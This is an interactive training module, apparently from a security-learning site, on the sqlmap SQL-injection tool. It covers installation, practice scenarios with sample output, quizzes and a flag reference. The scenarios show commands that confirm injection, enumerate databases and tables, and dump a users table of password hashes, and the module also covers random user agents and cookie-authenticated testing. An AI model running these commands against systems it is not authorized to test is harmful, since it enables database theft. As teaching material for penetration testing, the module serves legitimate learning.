# SQLMap

SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications.

## Overview

SQLMap is essential for:
- **Detection**: Automatically find SQL injection points
- **Exploitation**: Extract data from vulnerable databases
- **Enumeration**: List databases, tables, columns, and data
- **Access**: Gain shell access on vulnerable systems

### Installation

SQLMap is pre-installed on most security-focused Linux distributions (Kali, Parrot). To install on other systems:

```bash
# Clone from GitHub
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# Run directly with Python
python sqlmap.py -h

# Or install via package manager (Ubuntu/Debian)
sudo apt install sqlmap
```

:::command-builder{id="sqlmap-builder"}
tool_name: sqlmap
target_placeholder: "http://example.com/page?id=1"
scan_types:
  - name: "Test URL"
    flag: "-u"
    desc: "Test a URL with parameter"
  - name: "POST Data"
    flag: "-u URL --data"
    desc: "Test POST parameters"
  - name: "From Request"
    flag: "-r"
    desc: "Load request from file"
options:
  - name: "List Databases"
    flag: "--dbs"
    desc: "Enumerate databases"
  - name: "List Tables"
    flag: "--tables"
    desc: "Enumerate tables"
  - name: "Dump Data"
    flag: "--dump"
    desc: "Extract table data"
  - name: "Batch Mode"
    flag: "--batch"
    desc: "Never ask for input"
:::

## Basic Syntax

The basic SQLMap command structure is:

```
sqlmap -u "URL" [options]
```

**Target formats:**
- URL with parameter: `http://site.com/page?id=1`
- POST data: `-u "http://site.com/login" --data "user=test&pass=test"`
- Request file: `-r request.txt`

---

:::scenario{id="scenario-1" level="beginner"}
title: "Test a URL for SQL Injection"
goal: "Check if a URL parameter is vulnerable to SQL injection."
hint: "Use the -u flag with a URL that has a parameter (like ?id=1). SQLMap will automatically test for vulnerabilities."
command: "sqlmap -u \"http://testsite.com/page?id=1\""
expected_output: |
  [*] starting @ 10:30:00

  [10:30:01] [INFO] testing connection to the target URL
  [10:30:01] [INFO] testing if the target URL is stable
  [10:30:02] [INFO] target URL is stable
  [10:30:02] [INFO] testing if GET parameter 'id' is dynamic
  [10:30:02] [INFO] GET parameter 'id' appears to be dynamic
  [10:30:03] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
  [10:30:05] [INFO] GET parameter 'id' is 'MySQL >= 5.0 error-based' injectable

  GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N]
:::

:::scenario{id="scenario-2" level="beginner"}
title: "Enumerate Databases"
goal: "List all databases on a vulnerable server."
hint: "After confirming a vulnerability, use --dbs to list all available databases. Add --batch to skip confirmation prompts."
command: "sqlmap -u \"http://testsite.com/page?id=1\" --dbs --batch"
expected_output: |
  [*] starting @ 10:35:00

  [10:35:01] [INFO] resuming back-end DBMS 'mysql'
  [10:35:01] [INFO] testing connection to the target URL
  [10:35:02] [INFO] fetching database names
  available databases [3]:
  [*] information_schema
  [*] mysql
  [*] webapp_db

  [10:35:03] [INFO] fetched data logged to text files
:::

:::scenario{id="scenario-3" level="beginner"}
title: "List Tables in a Database"
goal: "Enumerate all tables within a specific database."
hint: "Use -D to specify the database name and --tables to list its tables."
command: "sqlmap -u \"http://testsite.com/page?id=1\" -D webapp_db --tables --batch"
expected_output: |
  [*] starting @ 10:40:00

  [10:40:01] [INFO] fetching tables for database: 'webapp_db'
  Database: webapp_db
  [3 tables]
  +-----------+
  | users     |
  | products  |
  | orders    |
  +-----------+

  [10:40:02] [INFO] fetched data logged to text files
:::

:::scenario{id="scenario-4" level="intermediate"}
title: "Extract Data from a Table"
goal: "Dump all data from a specific table."
hint: "Use -D for database, -T for table, and --dump to extract data. You can also use -C to specify columns."
command: "sqlmap -u \"http://testsite.com/page?id=1\" -D webapp_db -T users --dump --batch"
expected_output: |
  [*] starting @ 10:45:00

  [10:45:01] [INFO] fetching columns for table 'users' in database 'webapp_db'
  [10:45:02] [INFO] fetching entries for table 'users' in database 'webapp_db'
  Database: webapp_db
  Table: users
  [3 entries]
  +----+----------+------------------+
  | id | username | password         |
  +----+----------+------------------+
  | 1  | admin    | 5f4dcc3b5aa765d6 |
  | 2  | user1    | e99a18c428cb38d5 |
  | 3  | user2    | d8578edf8458ce06 |
  +----+----------+------------------+

  [10:45:03] [INFO] table 'webapp_db.users' dumped to CSV file
:::

:::scenario{id="scenario-5" level="intermediate"}
title: "Test POST Parameters"
goal: "Test a login form for SQL injection vulnerabilities."
hint: "Use --data to specify POST parameters. SQLMap will test each parameter for injection."
command: "sqlmap -u \"http://testsite.com/login\" --data \"username=admin&password=test\" --batch"
expected_output: |
  [*] starting @ 10:50:00

  [10:50:01] [INFO] testing connection to the target URL
  [10:50:02] [INFO] testing if the target URL is stable
  [10:50:02] [INFO] target URL is stable
  [10:50:03] [INFO] testing if POST parameter 'username' is dynamic
  [10:50:03] [INFO] POST parameter 'username' appears to be dynamic
  [10:50:04] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
  [10:50:06] [INFO] POST parameter 'username' is 'MySQL >= 5.0 boolean-based blind' injectable

  POST parameter 'username' is vulnerable.
:::

## Tips & Tricks

### Risk and Level

Control how aggressive SQLMap tests:

| Option | Description |
|--------|-------------|
| `--level=1-5` | Test thoroughness (default: 1) |
| `--risk=1-3` | Risk of tests (default: 1) |

Higher levels test more injection points (cookies, headers). Higher risk includes tests that might modify data.

### Useful Options

```bash
# Skip confirmation prompts
sqlmap -u "URL" --batch

# Use specific technique
sqlmap -u "URL" --technique=BEU  # Boolean, Error, Union

# Specify DBMS to speed up
sqlmap -u "URL" --dbms=mysql

# Use random user agent
sqlmap -u "URL" --random-agent

# Increase verbosity
sqlmap -u "URL" -v 3
```

### Working with Authentication

```bash
# With cookies
sqlmap -u "URL" --cookie="session=abc123"

# With headers
sqlmap -u "URL" --headers="Authorization: Bearer token"

# From Burp request file
sqlmap -r request.txt
```

### Output and Logging

```bash
# Save output to directory
sqlmap -u "URL" --output-dir=/path/to/output

# Store session for resuming
sqlmap -u "URL" --session=mysession
```

---

:::quiz{id="quiz-1"}
Q: Which flag is used to enumerate all databases on a vulnerable server?
- [ ] --tables
- [x] --dbs
- [ ] --dump
- [ ] -D
:::

:::quiz{id="quiz-2"}
Q: What does the --batch flag do?
- [ ] Tests multiple URLs at once
- [ ] Increases scan speed
- [x] Runs without asking for user input
- [ ] Saves output to a file
:::

:::quiz{id="quiz-3"}
Q: Which option specifies POST data to test?
- [ ] -p
- [ ] --post
- [x] --data
- [ ] -d
:::

## Quick Reference

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL with parameter |
| `--data` | POST data to test |
| `-r FILE` | Load request from file |
| `--dbs` | Enumerate databases |
| `-D DB` | Specify database |
| `--tables` | Enumerate tables |
| `-T TABLE` | Specify table |
| `--columns` | Enumerate columns |
| `-C COL` | Specify columns |
| `--dump` | Dump table data |
| `--batch` | Non-interactive mode |
| `--level` | Test thoroughness (1-5) |
| `--risk` | Test risk level (1-3) |
| `--dbms` | Specify DBMS type |
| `--random-agent` | Use random User-Agent |
| `--cookie` | Set HTTP cookie |
| `-v` | Verbosity level (0-6) |
